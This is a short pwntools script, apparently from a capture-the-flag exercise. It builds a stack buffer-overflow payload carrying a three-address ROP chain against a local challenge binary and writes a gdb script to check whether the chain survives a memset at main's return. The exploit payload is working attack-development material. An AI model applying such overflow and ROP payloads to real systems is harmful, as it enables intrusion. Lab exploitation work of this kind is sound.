#!/usr/bin/env python3
# Determine EXACTLY what the __gets memset destroys, and whether a NUL-containing ROP chain
# placed at buf+88 survives, by inspecting the stack at main's ret in gdb.
import os
os.environ["TERM"]="xterm"
from pwn import *
context.binary=ELF("/work/waf/waf/chal",checksec=False)
context.log_level="error"

# Send: "exit" + filler + a fake chain with NUL-containing addresses, then dump stack at ret.
payload = b"exit" + b"A"*(88-4) + p64(0x4011dd) + p64(0x404060) + p64(0x4012a2)
open("/tmp/pl.bin","wb").write(payload)

script = """
set pagination off
break *0x401373
run < /tmp/pl.bin
printf "=== stack at ret ===\\n"
x/12gx $rsp
printf "RBP=%#lx\\n", $rbp
quit
"""
open("/tmp/gs","w").write(script)
